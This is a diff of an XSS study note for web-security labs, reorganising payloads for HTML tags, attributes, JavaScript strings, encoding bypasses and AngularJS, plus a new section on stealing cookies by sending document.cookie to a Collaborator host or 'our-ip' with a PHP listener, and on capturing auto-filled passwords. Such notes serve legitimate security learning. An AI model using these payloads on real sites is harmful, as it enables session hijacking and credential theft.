@@ -91,6 +91,19 @@ This is harder than HTML sinks as the entered data will not be found in the sour
 
 > The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire.
 
+###### Reflected DOM XSS
+
+The server can process data from a request, (unsafe data), and then returns this data back in a response.
+- This data is reflected in a response, and placed in the DOM.
+- This data could be processed by a script on the website that could eventually place it in a *sink*.
+
+> The idea is the same, to look for a *taint flow*, but the data could be coming from the server.
+
+###### Stored DOM XSS
+
+Data is stored at the server, and then returned to the website in a later response.
+- A script with a *sink* could later process this data in an unsafe way.
+
 ###### DOM XSS in jQuery
 
 The `attr()` function can change the attributes of DOM elements.
@@ -128,19 +141,6 @@ Checking the functions in the scope using the `id` of an element in that scope.
 angular.element(document.getElementById('<ID>')).scope()
 ```
 
-###### Reflected DOM XSS
-
-The server can process data from a request, (unsafe data), and then returns this data back in a response.
-- This data is reflected in a response, and placed in the DOM.
-- This data could be processed by a script on the website that could eventually place it in a *sink*.
-
-> The idea is the same, to look for a *taint flow*, but the data could be coming from the server.
-
-###### Stored DOM XSS
-
-Data is stored at the server, and then returned to the website in a later response.
-- A script with a *sink* could later process this data in an unsafe way.
-
 ---
 ### Injections and Payloads
 
@@ -149,6 +149,12 @@ Some payloads and methods to inject payloads.
 - Try using all special characters to see which ones work: `< > " ' \ / ;`
 - `iframes` can be used to create attacks that operate without user input.
 
+Sometimes, trying to inject special characters like `"` gets escaped by the addition of a backslash `\`.
+- Add an extra backslash `\` such that the one added by the application gets escaped by the one we added.
+```
+\" alert(1)
+```
+
 ###### Injecting in HTML Tags
 
 ```
@@ -156,15 +162,63 @@ Some payloads and methods to inject payloads.
 ```
 - If tags and events are blocked, use the [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and try all the tags and events there using [[Burp Suite]] Intruder.
 
-###### Escaping the Escape Character `\`
-
-Sometimes, trying to inject special characters like `"` gets escaped by the addition of a backslash `\`.
-- Add an extra backslash `\` such that the one added by the application gets escaped by the one we added.
+We can also create custom tags of our own.
 ```
-\" alert(1)
+<script> location = "https://vulnerable-website/search= <mins id=omar onfocus=alert(document.cookie)> tabindex=1 #omar"; </script>
+```
+- This script locates to the vulnerable website and injects in the `search` parameter a custom tag that alerts the cookie.
+- The `onfocus` event works when the browser TABs onto the tag, so we use `tabindex` to automatically tab once to it, since we have the `#omar` that goes to it.
+
+The `svg` tag allows for other tags inside it, which can be used to craft more complex exploits where some tags are blocked.
+``` HTML
+<svg> <animatetransform onbegin=alert(1)> </svg>
+
+<svg> 
+  <a>
+    <animate attributeName='href' values='javascript:alert(1)'></animate>
+    <text x='10' y='10'> Click </text>
+  </a> 
+</svg>
 ```
 
-###### Breaking out of a String
+###### Injecting in HTML Attributes
+
+Terminate the attribute, then close the tag, then add a new tag.
+```
+mins"> <svg onload=alert(1)>
+```
+
+This terminates the tag, but doesn't add the closing quotes and angle brackets at the end such that the injected attribute's own ones are used, ensuring proper syntax.
+```
+"> <body onload="alert()
+```
+
+If terminating the tag itself is hard since angle brackets are usually blocked, simply add a new attribute.
+```
+" onfocus=alert() autofocus x="
+```
+- This creates an `onfocus` event, and adds the `autofocus` attribute to trigger the `onfocus` automatically.
+- To ensure there is no syntax error, it then closes off the remainder of the attribute and the tag.
+
+If the source is an `href` attribute, we can execute JavaScript code using the [[Protocol]].
+```
+javascript:alert()
+```
+
+Access keys allow you to provide keyboard shortcuts that reference a specific element, done using the `accesskey` attribute. 
+```
+accesskey="x" onclick="alert()"
+```
+- When the letter defined `x` is pressed with `ALT` or `ALT SHIFT`, the event `onclick` will fire, producing the `alert()`.
+
+###### Injecting in JavaScript
+
+We can simply terminate the current script and add a new one.
+```
+</script><img src=1 onerror=alert(document.domain)>
+```
+
+To escape from a string inside the JavaScript.
 ```
 '-alert(document.domain)-' 
 ';alert(document.domain)//
@@ -175,72 +229,29 @@ Sometimes, trying to inject special characters like `"` gets escaped by the addi
 - Try adding `\` before the quotes if they are escaped by the application.
 - Adding `//` comments out everything after it.
 
-
+If the brackets are encoded, we can use the `throw` exception handler.
 ```
-mins"> <svg onload=alert(1)>     //closing off a tag and adding a new one.
-
-" onfocus=alert() autofocus x="  //closing off an attribute and adding a new one and 
-closing off the rest.
-
-"> <body onload="alert()         // closing off an attribute and adding a new element to close of the remaining qoute and angle bracket.
-
-minso> </select> <svg onload=alert()>
-
-<img src=1 onerror=alert(1)>
-
-href = javascript:alert(document.cookie)
-
-{{ $new.constructor('alert()') () }}  //angular
-
-</script><img src=1 onerror=alert(document.domain)>  //breaking out of the script and adding our own code.
-
-</script><script>alert()</script>     //same as above but adding a new script tag.
-
-<iframe src ="https://0a0b00b9043b4ccf8331690900400055.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
-
-onerror=alert; throw,1       // when brackets are encoded and cannot be used.
-
-//if no tags are allowed use the script technique with the location attribute
-<script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search= <mins id=omar onfocus=alert(document.cookie)> #omar"; </script>
+onerror=alert;throw 1
 ```
-> This last one creates a custom tag `mins`, and adds the attribute `onfocus` and then focuses on it using the `#omar` at the end using its id, triggering the event. Can use the `autofocus` attribute as well.
+- The `throw` passes the 1 to the exception handler, which has the `alert()` function assigned it to.
 
 ###### Using HTML- [[Web Encoding]]
 
-> Using HTML encoding to bypass sanitization checks.
-> The browser can decode the encoded attack while interpreting the JavaScript, so the attack succeeds.
+Using HTML encoding to bypass sanitization checks.
+- The browser can decode the encoded attack while interpreting the JavaScript, so the attack succeeds.
 ```
 &apos;-alert(document.domain)-&apos;
 ```
-> The apostrophe gets sanitized, so inputting encoded passes these checks, and then the browser decodes it while interpreting the javascript.
-> Find the list of codes [here](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references).
-> Can also use the hex version encoding, or numbers.
 
-###### `<svg>`
-
-> The `svg` tag allows for other tags inside it, which can be used to craft more complex exploits where some tags are blocked.
-``` HTML
-<svg> <animatetransform onbegin=alert(1)> </svg>
-
-<svg> <a>
-<animate attributeName='href' values='javascript:alert(1)'></animate>
-<text x='10' y='10'> Click </text>
-</a> </svg>
-```
+Find the list of codes [here](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references).
+- Can also use the hex version encoding, or numbers.
 
 ###### JavaScript String Literals
 
-> Similar to Angular [[String Interpolation]], where there is javascript executed inside html between the ` `` ` backticks.
-> If the XSS input is there, we can put the payload between `${ <code> }` .
+Similar to Angular [[String Interpolation]], where there is JavaScript executed inside html between the ` `` ` backticks.
 ```
 ${alert(1)}
 ```
-
-###### Canonical Tags in XSS
-
-> Some events aren't fired automatically.
-> They use the `accesskey` attribute that defines a letter.
-> If this letter is pressed with a combination of other keys, the assigned event is triggered.
 
 ---
 
@@ -265,29 +276,43 @@ toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constru
 >Those ASCII codes translate to `x=alert(1)`.
 
 ---
+### Exploiting XSS
 
-### [[Cookies]] Stealing With XSS, Session Hijacking
+###### [[Cookies]] Stealing
 
 We are stealing a user's cookies and then using them to steal their logged in session.
+- JavaScript can only access [[Cookies]] if the `HttpOnly` flag is disabled. 
+- The victim must be logged in.
 
-> JavaScript can only access [[Cookies]] if the `HttpOnly` flag is disabled. 
-> Cookies can be displayed with `<script>alert(document.cookie)</script>`.
+> Check [[Session Security#Using Cross Site Scripting (XSS)]] for more payloads.
 
-> This is a stored attack, meaning it will be put in a place where users visit, so their cookies are stolen and sent to that website URL.
-> The subdomain of the cookie should be the same as the subdomain of the website in which the cookie is.
+The idea is to send cookies to an attacker controlled domain, allowing an attacker to steal the user's [[Sessions]].
+- Here is using [[Burp Suite]] Collaborator.
+```
+<script>
+fetch('https://ydfa57m120i4eumqf8396fs67xdo1hp6.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
 
-> To send cookies to us:
+To send cookies:
 ```JavaScript
 document.location='our-ip/'+document.cookie
 ```
-
-This payload should be injected in the vulnerable XSS injection point. To start a listener:
+To start a listener:
 ```bash
 sudo php -S 0.0.0.0:80
 ```
 
----
+###### Password Capturing
 
+Can utilize password managers that auto-fill in password fields by adding a password field that is controlled by the attacker.
+- The data in the password field is then sent to an attacker controlled domain.
+
+---
 ### Content Security Policy (CSP)
 
 > Browser mechanism to mitigate XSS via the [[HTTP]] response header `Content-Security-Policy`.
